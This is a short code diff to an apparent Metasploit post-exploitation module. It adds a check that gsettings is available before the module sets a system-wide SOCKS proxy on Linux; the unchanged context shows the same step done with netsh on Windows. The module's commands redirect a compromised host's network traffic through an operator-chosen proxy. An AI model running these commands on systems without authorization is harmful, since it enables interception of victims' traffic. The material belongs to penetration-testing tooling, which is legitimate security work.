@@ -31,7 +31,12 @@ class MetasploitModule < Msf::Post
       print_status('Windows detected, using netsh')
       vprint_status cmd_exec("netsh winhttp set proxy proxy-server=\"socks=#{datastore["RHOST"]}:#{datastore["RPORT"]}\" bypass-list=\"<local>\"")
     else
-      print_status('Linux detected, using gsettings')
+      unless command_exists? 'gsettings'
+        return print_error('Gsettings is not available')
+      end
+
+      print_good('Gsettings available')
+
       vprint_status cmd_exec("gsettings set org.gnome.system.proxy mode 'manual'") # tell NetworkManager there is a proxy
       vprint_status cmd_exec("gsettings set org.gnome.system.proxy.socks port #{datastore["RPORT"]}")
       vprint_status cmd_exec("gsettings set org.gnome.system.proxy.socks host #{datastore["RHOST"]}")
